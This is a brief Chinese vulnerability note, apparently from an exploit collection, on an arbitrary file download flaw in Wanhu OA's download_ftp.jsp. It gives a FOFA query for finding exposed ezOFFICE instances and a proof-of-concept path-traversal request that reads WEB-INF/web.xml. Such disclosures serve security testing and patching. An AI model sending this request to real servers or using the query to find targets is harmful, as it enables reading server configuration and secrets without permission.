# 万户OA download_ftp.jsp 任意文件下载漏洞

## 漏洞描述

万户OA download_ftp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

```
万户OA
```

## FOFA

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![image-20220520132512473](./images/202205201325574.png)

验证POC

```
/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
```

![image-20220520132537562](./images/202205201325636.png)

